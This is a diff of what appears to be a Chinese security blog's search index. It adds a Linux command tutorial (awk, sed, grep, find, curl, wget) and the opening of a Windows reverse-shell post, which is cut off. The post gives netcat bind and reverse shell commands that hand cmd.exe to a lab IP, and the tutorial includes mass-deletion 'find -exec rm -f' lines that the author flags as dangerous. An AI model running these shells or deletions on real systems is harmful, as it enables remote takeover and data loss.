@@ -585,6 +585,145 @@ M1001 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">�
       </tags>
   </entry>
   <entry>
+    <title>Linux基础命令-3</title>
+    <url>/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/</url>
+    <content><![CDATA[<h1 id="Linux基础命令（3）"><a href="#Linux基础命令（3）" class="headerlink" title="Linux基础命令（3）"></a>Linux基础命令（3）</h1><h5 id="成殇Orz"><a href="#成殇Orz" class="headerlink" title="成殇Orz"></a>成殇Orz</h5><h3 id="0x01-Linux介绍"><a href="#0x01-Linux介绍" class="headerlink" title="0x01 Linux介绍"></a>0x01 Linux介绍</h3><p>Linux，全称GNU/Linux，是一种免费使用和自由传播的类UNIX操作系统，其内核由林纳斯·本纳第克特·托瓦兹于1991年10月5日首次发布，它主要受到Minix和Unix思想的启发，是一个基于POSIX和Unix的多用户、多任务、支持多线程和多CPU的操作系统。Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。它能运行主要的Unix工具软件、应用程序和网络协议。它支持32位和64位硬件。严格来讲，Linux这个词本身只表示Linux内核，但实际上人们已经习惯了用Linux来形容整个基于Linux内核，并且使用GNU 工程各种工具和数据库的操作系统。</p>
+<span id="more"></span>
+
+<h3 id="0x02-Linux常用命令"><a href="#0x02-Linux常用命令" class="headerlink" title="0x02 Linux常用命令"></a>0x02 Linux常用命令</h3><h4 id="2-1-awk-命令"><a href="#2-1-awk-命令" class="headerlink" title="2.1 awk 命令"></a>2.1 awk 命令</h4><p><code>awk</code>是一种处理文本文件的语言，是一个强大的文本分析工具。</p>
+<p>相比较屏幕处理的优点，<code>awk</code>在处理庞大文件时不会出现内存溢出或是处理缓慢的问题，通常用来格式化文本信息。 <code>awk</code>也是一个非常棒的数据处理工具！相较于<code>sed</code>常常作用于一整个行的处理, <code>awk</code>则比较倾向于一行当中分成数个<code>字段</code>来处理。</p>
+<p><code>awk</code>处理过程: 依次对每一行进行处理，然后输出。</p>
+<p>命令的基本格式是：<code>awk ‘&#123;print($1)&#125;’</code></p>
+<p>案例：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat 2.txt|awk <span class="string">&#x27;&#123;print($2)&#125;&#x27;</span>                 <span class="comment">#打印出文本中每行的第二个字段</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/1.png"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat passwd |awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print($1)&#125;&#x27;</span>  		<span class="comment">#-F指定分隔符，以“：”为分隔符，打印出文本中每行第一个字段</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/2.png"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat passwd |awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print($1,&quot;+++&quot;,$3)&#125;&#x27;</span>	<span class="comment">#打印出第一个字段与第三个字段，并在其中间添+++内容</span></span><br><span class="line">cat passwd |awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print($1&quot;+++&quot;$3)&#125;&#x27;</span>     </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/3.png"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat passwd | awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print $NF&#125;&#x27;</span>       <span class="comment">#打印出文本中每行的最后一个字段</span></span><br><span class="line">cat passwd | awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print $(NF-1)&#125;&#x27;</span>   <span class="comment">#打印出文本中每行的倒数第二个字段。</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/4.png"></p>
+<h4 id="2-2-sed-命令"><a href="#2-2-sed-命令" class="headerlink" title="2.2 sed 命令"></a>2.2 sed 命令</h4><p><code>sed</code> 是stream editor(流编辑器)的简称，是一款强大的,并且有些复杂的程序。</p>
+<p><code>sed</code> 本身是一个管线命令，可以将数据进行替换、删除、新增、提取特定行等功能，主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等。sed按行来执行命令。</p>
+<p>拷贝文件<code>cat /etc/passwd &gt; 1.txt</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat passwd | sed <span class="string">&#x27;s/:/+/g&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>s代表搜索，g代表的则是全文。不加g的话则是替换每行第一个出现的。所以这条命令代表的将文件中所有的：替换为+</p>
+<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/5.png"></p>
+<p><code>cat passwd |sed &#39;s/:/+/3g&#39;</code> #代表的则是从第三次匹配开始替换，依此类推。</p>
+<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/6.png"></p>
+<p><code>sed -i &#39;s/:/+/g&#39; 1.txt</code> #参数<code>-i</code>,直接修改文件，并非打印出来。</p>
+<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/7.png"></p>
+<p>以上这些命令中是以/做为该命令的定界符，如果需要修改或者匹配的字段带有/则不能再使用/做为该条命令的定界符，可以使用任意的定界符，不冲突就行。<code>cat passwd |sed &#39;s!:!/!g&#39;</code> 以！号做为定界也是一样的。</p>
+<p>此外，在此命令中，搜索位置使用<code>^</code>代表一行的开头，<code>$</code>代表一行的结尾。<code>sed</code>是以行为单位执行的。</p>
+<p><code>cat ip.txt |sed &#39;s#^#http://#g&#39;</code>在每行之前加上<code>http://</code>。</p>
+<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/Users\46003\AppData\Roaming\Typora\typora-user-images\image-20220509195350587.png" alt="image-20220509195350587"></p>
+<p><code>cat ip.txt |sed &#39;s#$#:8080#g&#39;</code>在每行末尾加上“:8080”</p>
+<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/8.png"></p>
+<p><code>sed &#39;/^$/d&#39; 2.txt</code>删除空白的行。</p>
+<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/9.png"></p>
+<p><code>sed &#39;/^192/&#39;d</code> 删除文件中所有开头是192的行。</p>
+<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/10.png"></p>
+<h4 id="2-3-grep-命令"><a href="#2-3-grep-命令" class="headerlink" title="2.3 grep 命令"></a>2.3 grep 命令</h4><p>grep这个名字来自于短语“global regular expression print”，所以我们能看出 grep 程序和正则表达式有关联。</p>
+<p>本质上，grep 程序会在文本文件中查找一个指定的正则表达式,并把匹配行输出到标准输出。</p>
+<p>命令格式： <code>grep [options] [pattern]　[filename]</code></p>
+<p>案例：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat passwd |grep root                          <span class="comment"># 只显示带有root关键字的行</span></span><br><span class="line">grep -e root passwd                            <span class="comment"># 匹配有root的行</span></span><br><span class="line">grep -v root passwd                            <span class="comment"># 忽略匹配到的行</span></span><br><span class="line">cat passwd |grep -E <span class="string">&quot;root|sshd&quot;</span>                <span class="comment"># 包含多个可能性的行</span></span><br><span class="line">cat passwd |grep -E <span class="string">&#x27;^r&#x27;</span>                       <span class="comment"># 以r开头的行</span></span><br><span class="line">cat passwd |grep -E <span class="string">&#x27;n$&#x27;</span>                       <span class="comment"># 以n结尾的行</span></span><br><span class="line">grep “root” /etc/passwd /etc/shad ow            <span class="comment"># 查询多个文件</span></span><br><span class="line">grep <span class="string">&quot;passwd&quot;</span> /etc -rn                         <span class="comment"># -r 为递归 -n 显示关键字出现在第几行   在多级目录中对文本进行递归查找</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/11.png"></p>
+<h4 id="2-4-find-命令"><a href="#2-4-find-命令" class="headerlink" title="2.4 find 命令"></a>2.4 find 命令</h4><p><code>find</code> 命令用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则 find 命令将在当前目录下查找子目录与文件。并且将查找到的子目录和文件全部进行显示。</p>
+<p>这是一个超级复杂的命令，最简单的模式为：<code>find 路径 -name [名字]</code>。</p>
+<p>案例：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -size 1000k                <span class="comment">#从根目录查找大小为1000K的文件</span></span><br><span class="line">find   -name <span class="string">&#x27;1*&#x27;</span>                 <span class="comment">#在当前目录下查找文件名以1开始的文件</span></span><br><span class="line">find / -name <span class="string">&#x27;1*&#x27;</span>                 <span class="comment">#从根目录查找文件名以1开始的文件</span></span><br><span class="line">find / -user root            	  <span class="comment">#从根目录查找属主为root的文件</span></span><br><span class="line">find / -group root                <span class="comment">#从根目录查找属组为root的文件</span></span><br><span class="line">find /etc -<span class="built_in">type</span> f/d               <span class="comment">#按sock类型查找，f代表文件，d代表目录</span></span><br><span class="line">find . -<span class="built_in">type</span> f -mtime -7          <span class="comment">#搜索7天内当前目录下修改过的文件（-7代表7天内，7代表前7天那一天，+7代表7天前）</span></span><br><span class="line">find . -<span class="built_in">type</span> f -mmin -10          <span class="comment">#搜索10分钟内当前目录下修改过的文件 </span></span><br><span class="line">find . -atime -1 -<span class="built_in">type</span> f          <span class="comment">#搜索当前目录下一天内被访问的文件（-1代表1天内，1代表前1天那一天，+1代表1天前）</span></span><br><span class="line">find . -amin -10 -<span class="built_in">type</span> f          <span class="comment">#搜索当前目录下10分钟内被访问的文件</span></span><br><span class="line">find . -ctime -1 -<span class="built_in">type</span> f          <span class="comment">#搜索当前目录下一天内状态被改变（列如权限）的文件（-1代表1天内，1代表前1天那一天，+1代表1天前）</span></span><br><span class="line">find . -cmin -10 -<span class="built_in">type</span> f          <span class="comment">#搜索当前目录下10分钟内状态被改变的文件</span></span><br><span class="line">find . -perm 777                  <span class="comment">#搜索处当前文件下符合777权限的文件</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>exec选项</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find 搜索路径 [选项] 搜索内容 -<span class="built_in">exec</span> 命令2&#123;&#125;\;</span><br><span class="line">find . -<span class="built_in">type</span> f -perm 644 -<span class="built_in">exec</span> ls -l &#123;&#125; \;</span><br><span class="line">find / -<span class="built_in">exec</span> grep <span class="string">&quot;Hello&quot;</span> &#123;&#125; \;</span><br><span class="line"></span><br><span class="line">find / -name <span class="string">&quot;*.tmp&quot;</span> -<span class="built_in">exec</span> rm -f &#123;&#125; \;           <span class="comment">#(危险)</span></span><br><span class="line">find / -name <span class="string">&quot;*&quot;</span> -ctime +2 -<span class="built_in">exec</span> rm -f &#123;&#125; \;     <span class="comment">#（危险，别敲）</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="2-5-ag-命令"><a href="#2-5-ag-命令" class="headerlink" title="2.5 ag 命令"></a>2.5 ag 命令</h4><p><code>ag</code>类似<code>grep</code>和<code>find</code>，但是执行效率比后两者高。</p>
+<p>最基本的用法为<code>ag -g &lt;File Name&gt;</code>,从当前目录寻找文件</p>
+<p>案例：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ag -g &lt;File Name&gt;            <span class="comment"># 类似于 find . -name &lt;File Name&gt;</span></span><br><span class="line">ag -i PATTERN                <span class="comment"># 忽略大小写搜索含PATTERN文本</span></span><br><span class="line">ag -A [number] PATTERN       <span class="comment">#搜索含PATTERN文本，并显示匹配内容之后的n行文本，例如：ag -A 5  abc会显示搜索到的包含abc的行以及它之后5行的文本信息。</span></span><br><span class="line">ag -B [number] PATTERN       <span class="comment">#搜索含PATTERN文本，并显示匹配内容之前的n行文本</span></span><br><span class="line">ag -C [number] PATTERN       <span class="comment">#搜索含PATTERN文本，并同时显示匹配内容以及它前后各n行文本的内容。</span></span><br><span class="line">ag --ignore-dir &lt;Dir Name&gt;   <span class="comment">#忽略某些文件目录进行搜索。</span></span><br><span class="line">ag -w PATTERN                <span class="comment">#全匹配搜索，只搜索与所搜内容完全匹配的文本。</span></span><br><span class="line">ag --java PATTERN            <span class="comment">#在java文件中搜索含PATTERN的文本。</span></span><br><span class="line">ag --xml PATTERN             <span class="comment">#在XML文件中搜索含PATTERN的</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="2-6-stat命令"><a href="#2-6-stat命令" class="headerlink" title="2.6 stat命令"></a>2.6 stat命令</h4><p>用于显示文件信息：</p>
+<p>用法：stat [文件或目录]</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">stat <span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/12.png"></p>
+<h4 id="2-7-split-命令"><a href="#2-7-split-命令" class="headerlink" title="2.7 split 命令"></a>2.7 split 命令</h4><p><code>split</code>命令可以将一个大文件分割成很多个小文件，有时需要将文件分割成更小的片段，比如为提高可读性，生成日志等。</p>
+<p>参数：</p>
+<ul>
+<li>-b 按文件大小进行切割</li>
+<li>-l 按行数来进行切割</li>
+<li>-d 为使用数字为生成文件的后缀</li>
+<li>-a 指定后缀的长度</li>
+</ul>
+<p>案例：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">split -b 30k messages    <span class="comment"># 按照每个文件30K大小切割messages文件。</span></span><br><span class="line">split -l 300 messages    <span class="comment"># 将messages文件切割为每3行一份。</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="2-8-sort命令"><a href="#2-8-sort命令" class="headerlink" title="2.8 sort命令"></a>2.8 sort命令</h4><p><code>sort</code>命令是将文件进行排序，并将排序结果标准输出。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat 1.txt|sort            <span class="comment">#默认的排序方式，从首字母开始</span></span><br><span class="line">cat 1.txt|sort -t         <span class="comment">#按照字典进行排序</span></span><br><span class="line">cat 1.txt|sort -n         <span class="comment">#按照数字进行排序</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/13.png"></p>
+<h4 id="2-9-uniq-命令"><a href="#2-9-uniq-命令" class="headerlink" title="2.9 uniq 命令"></a>2.9 uniq 命令</h4><p><code>uniq</code>用于报告或忽略文件中的重复行，一般与sort命令结合使用。</p>
+<p>要注意先排序，后去重。因为uniq命令只能消除相邻且相同的行。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat 1.txt |sort -n |uniq              <span class="comment">#排序去重</span></span><br><span class="line">cat 1.txt|sort -n |uniq -c            <span class="comment">#列出重复的次数</span></span><br><span class="line">cat 1.txt |sort -n |uniq -d           <span class="comment">#列出有哪些行是重复的</span></span><br></pre></td></tr></table></figure>
+
+<p>以上系列命令可以用于日志分析：</p>
+<p>如统计IP地址的访问数量并按照数量进行排序： <code>cat access_log |awk &#39;&#123;print($1)&#125;&#39;|sort|uniq -c |sort -nr |more</code></p>
+<p>针对访问量最大的IP分析其访问内容： <code>cat access_log |grep &#39;IP地址&#39;|head -n 100</code></p>
+<h4 id="2-10-nl-命令"><a href="#2-10-nl-命令" class="headerlink" title="2.10. nl 命令"></a>2.10. nl 命令</h4><p><code>nl</code>命令用于显示文件内容行号。</p>
+<p>案例：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd |nl</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x03-远程连接命令"><a href="#0x03-远程连接命令" class="headerlink" title="0x03 远程连接命令"></a>0x03 远程连接命令</h3><h4 id="3-1-ssh命令"><a href="#3-1-ssh命令" class="headerlink" title="3.1 ssh命令"></a>3.1 ssh命令</h4><p><code>ssh</code>命令是Linux的远程连接工具。</p>
+<p>ssh命令：Linux的远程连接工具</p>
+<p>例如<code>ssh 192.168.2.130</code>，以当前终端用户身份远程连接IP为<code>192.168.2.130</code>的计算机。</p>
+<ul>
+<li>-l 为指定用户 如 <code>ssh -l root 192.168.2.130</code>以root用户远程登录，也可写成<code>ssh root@192.168.0.149</code></li>
+<li>-p 为指定端口号</li>
+</ul>
+<p>执行<code>ssh</code>的默认情况下，会使用本地的用户名连接对方的用户名，例如本地的root连接对面服务器的root，如果两端用户名不一样，则需要使用<code>-l username</code>指定用户名。</p>
+<p>再确认密码后，方能登录成功，而同时变化的文件为：<code>/root/.ssh/known_hosts</code> 在第一次登录时，openssh将会提示不知道这台登录的主机，只要输入<code>yes</code>，就会把这台主机的“识别信息”添加到known_hosts文件中. 第二次登陆后，则无须此步骤，但是如果出现错误，例如主机产生变化，则需要删除<code>/root/.ssh/known_hosts</code>内容。</p>
+<h4 id="3-2-linux下远程连接smb"><a href="#3-2-linux下远程连接smb" class="headerlink" title="3.2 linux下远程连接smb"></a>3.2 linux下远程连接smb</h4><p>Smb服务为网络文件共享协议，它允许应用程序和终端用户从远端的文件服务器访问文件资源 用法：在kali的<code>文件</code>–&gt;<code>其他位置</code>–&gt;<code>连接到服务器</code>处输入：<code>smb://192.168.2.130/share</code></p>
+<h4 id="3-3-rdesktop-命令"><a href="#3-3-rdesktop-命令" class="headerlink" title="3.3 rdesktop 命令"></a>3.3 rdesktop 命令</h4><p><code>rdesktop</code>命令用于在linux下链接windows远程桌面。</p>
+<p>用法：<code>rdesktop 192.168.0.178</code></p>
+<p>关于此部分知识，还将在后续有关windows的章节中详述。</p>
+<h3 id="0x04-URL-相关命令"><a href="#0x04-URL-相关命令" class="headerlink" title="0x04 URL 相关命令"></a>0x04 URL 相关命令</h3><p>URL，既是俗称的网址/网页链接。</p>
+<h4 id="4-1-curl-命令"><a href="#4-1-curl-命令" class="headerlink" title="4.1 curl 命令"></a>4.1 curl 命令</h4><p><code>curl</code>命令是一个利用URL规则在命令行下工作的文件传输工具。它支持文件的上传和下载，所以是综合传输工具，但按传统，习惯称curl为下载工具。作为一款强力工具，curl支持包括HTTP、HTTPS、ftp等众多协议，还支持POST、cookies、认证、从指定偏移处下载部分文件、用户代理字符串、限速、文件大小、进度条等特征。</p>
+<p>用法：<code>curl [选项] [url]</code></p>
+<p>参数：</p>
+<ul>
+<li>-i 显示头部信息</li>
+<li>-v 显示请求全过程解析</li>
+<li>-O 下载</li>
+</ul>
+<p>案例：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl www.baidu.com</span><br><span class="line">curl www.baidu.com -i</span><br><span class="line">curl www.baidu.com -v</span><br><span class="line">curl -O https://bootstrap.pypa.io/get-pip.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/14.png"></p>
+<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/15.png"></p>
+<h4 id="4-2-wget-命令"><a href="#4-2-wget-命令" class="headerlink" title="4.2 wget 命令"></a>4.2 wget 命令</h4><p>wget命令：用来从指定的URL下载文件。wget非常稳定，它在带宽很窄的情况下和不稳定网络中有很强的适应性，如果是由于网络的原因下载失败，wget会不断的尝试，直到整个文件下载完毕。如果是服务器打断下载过程，它会再次联到服务器上从停止的地方继续下载。这对从那些限定了链接时间的服务器上下载大文件非常有用。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/get-pip.py</span><br></pre></td></tr></table></figure>
+
+<p>前面我们下载下的文件名都是乱码，所以我们需要给它自定义文件名 加入-O的参数即可指定文件名</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget  https://bootstrap.pypa.io/get-pip.py -O 123.py</span><br></pre></td></tr></table></figure>
+
+<p>如果文件比较大时，加入参数<code>-b</code>，进行后台下载，然后可使用使用<code>tail -f wget-log</code>查看进度。</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Linux基础命令-2</title>
     <url>/2022/06/08/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-2/</url>
     <content><![CDATA[<h1 id="Linux基础命令（2）"><a href="#Linux基础命令（2）" class="headerlink" title="Linux基础命令（2）"></a>Linux基础命令（2）</h1><h5 id="成殇Orz"><a href="#成殇Orz" class="headerlink" title="成殇Orz"></a>成殇Orz</h5><h3 id="0x01-Linux介绍"><a href="#0x01-Linux介绍" class="headerlink" title="0x01 Linux介绍"></a>0x01 Linux介绍</h3><p>Linux，全称GNU/Linux，是一种免费使用和自由传播的类UNIX操作系统，其内核由林纳斯·本纳第克特·托瓦兹于1991年10月5日首次发布，它主要受到Minix和Unix思想的启发，是一个基于POSIX和Unix的多用户、多任务、支持多线程和多CPU的操作系统。Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。它能运行主要的Unix工具软件、应用程序和网络协议。它支持32位和64位硬件。严格来讲，Linux这个词本身只表示Linux内核，但实际上人们已经习惯了用Linux来形容整个基于Linux内核，并且使用GNU 工程各种工具和数据库的操作系统。</p>
@@ -953,136 +1092,116 @@ M1001 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">�
       </tags>
   </entry>
   <entry>
-    <title>Linux基础命令-3</title>
-    <url>/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/</url>
-    <content><![CDATA[<h1 id="Linux基础命令（3）"><a href="#Linux基础命令（3）" class="headerlink" title="Linux基础命令（3）"></a>Linux基础命令（3）</h1><h5 id="成殇Orz"><a href="#成殇Orz" class="headerlink" title="成殇Orz"></a>成殇Orz</h5><h3 id="0x01-Linux介绍"><a href="#0x01-Linux介绍" class="headerlink" title="0x01 Linux介绍"></a>0x01 Linux介绍</h3><p>Linux，全称GNU/Linux，是一种免费使用和自由传播的类UNIX操作系统，其内核由林纳斯·本纳第克特·托瓦兹于1991年10月5日首次发布，它主要受到Minix和Unix思想的启发，是一个基于POSIX和Unix的多用户、多任务、支持多线程和多CPU的操作系统。Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。它能运行主要的Unix工具软件、应用程序和网络协议。它支持32位和64位硬件。严格来讲，Linux这个词本身只表示Linux内核，但实际上人们已经习惯了用Linux来形容整个基于Linux内核，并且使用GNU 工程各种工具和数据库的操作系统。</p>
+    <title>Window反弹Shell</title>
+    <url>/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/</url>
+    <content><![CDATA[<h1 id="Window反弹SHELL"><a href="#Window反弹SHELL" class="headerlink" title="Window反弹SHELL"></a>Window反弹SHELL</h1><h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-反弹SHELL简介"><a href="#0x00-反弹SHELL简介" class="headerlink" title="0x00  反弹SHELL简介"></a>0x00  反弹SHELL简介</h3><h6 id="什么是反弹shell（reverse-shell）？"><a href="#什么是反弹shell（reverse-shell）？" class="headerlink" title="什么是反弹shell（reverse shell）？"></a>什么是反弹shell（reverse shell）？</h6><p>就是控制端监听某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
+<h6 id="为什么需要反弹shell？"><a href="#为什么需要反弹shell？" class="headerlink" title="为什么需要反弹shell？"></a>为什么需要反弹shell？</h6><p>反弹shell通常用于被控端因防火墙受限、权限不足、端口被占用等情形。在渗透过程中，往往因为端口限制而无法直连目标机器，此时需要通过反弹shell来获取一个交互式shell，以便继续深入。</p>
+<blockquote>
+<p>正向shell：控制端主动发起连接请求去连接被控制端，中间网络链路不存在阻碍。</p>
+<p>反向Shell（反弹Shell）：被控端主动发起连接请求去连接控制端，通常被控端由于防火墙限制、权限不足、端 口被占用等问题导致被控端不能正常接收发送过来的数据包。</p>
+</blockquote>
 <span id="more"></span>
 
-<h3 id="0x02-Linux常用命令"><a href="#0x02-Linux常用命令" class="headerlink" title="0x02 Linux常用命令"></a>0x02 Linux常用命令</h3><h4 id="2-1-awk-命令"><a href="#2-1-awk-命令" class="headerlink" title="2.1 awk 命令"></a>2.1 awk 命令</h4><p><code>awk</code>是一种处理文本文件的语言，是一个强大的文本分析工具。</p>
-<p>相比较屏幕处理的优点，<code>awk</code>在处理庞大文件时不会出现内存溢出或是处理缓慢的问题，通常用来格式化文本信息。 <code>awk</code>也是一个非常棒的数据处理工具！相较于<code>sed</code>常常作用于一整个行的处理, <code>awk</code>则比较倾向于一行当中分成数个<code>字段</code>来处理。</p>
-<p><code>awk</code>处理过程: 依次对每一行进行处理，然后输出。</p>
-<p>命令的基本格式是：<code>awk ‘&#123;print($1)&#125;’</code></p>
-<p>案例：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat 2.txt|awk <span class="string">&#x27;&#123;print($2)&#125;&#x27;</span>                 <span class="comment">#打印出文本中每行的第二个字段</span></span><br></pre></td></tr></table></figure>
+<h3 id="0x01-Windows反弹Shell"><a href="#0x01-Windows反弹Shell" class="headerlink" title="0x01 Windows反弹Shell"></a>0x01 Windows反弹Shell</h3><h4 id="NetCat（NC）"><a href="#NetCat（NC）" class="headerlink" title="NetCat（NC）"></a>NetCat（NC）</h4><h6 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向shell</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#被控端</span></span><br><span class="line">nc <span class="literal">-lvvp</span> <span class="number">8888</span> <span class="literal">-e</span> cmd.exe</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/1.png"></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat passwd |awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print($1)&#125;&#x27;</span>  		<span class="comment">#-F指定分隔符，以“：”为分隔符，打印出文本中每行第一个字段</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/1.png"></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">nc <span class="number">192.168</span>.<span class="number">31.198</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/2.png"></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat passwd |awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print($1,&quot;+++&quot;,$3)&#125;&#x27;</span>	<span class="comment">#打印出第一个字段与第三个字段，并在其中间添+++内容</span></span><br><span class="line">cat passwd |awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print($1&quot;+++&quot;$3)&#125;&#x27;</span>     </span><br></pre></td></tr></table></figure>
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/2.png"></p>
+<h6 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#被控端</span></span><br><span class="line">nc <span class="literal">-e</span> cmd.exe <span class="number">192.168</span>.<span class="number">31.246</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/3.png"></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat passwd | awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print $NF&#125;&#x27;</span>       <span class="comment">#打印出文本中每行的最后一个字段</span></span><br><span class="line">cat passwd | awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print $(NF-1)&#125;&#x27;</span>   <span class="comment">#打印出文本中每行的倒数第二个字段。</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/3.png"></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#控制端</span></span><br><span class="line">nc <span class="literal">-lvvp</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/2022/06/09/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3/4.png"></p>
-<h4 id="2-2-sed-命令"><a href="#2-2-sed-命令" class="headerlink" title="2.2 sed 命令"></a>2.2 sed 命令</h4><p><code>sed</code> 是stream editor(流编辑器)的简称，是一款强大的,并且有些复杂的程序。</p>
-<p><code>sed</code> 本身是一个管线命令，可以将数据进行替换、删除、新增、提取特定行等功能，主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等。sed按行来执行命令。</p>
-<p>拷贝文件<code>cat /etc/passwd &gt; 1.txt</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat passwd | sed <span class="string">&#x27;s/:/+/g&#x27;</span></span><br></pre></td></tr></table></figure>
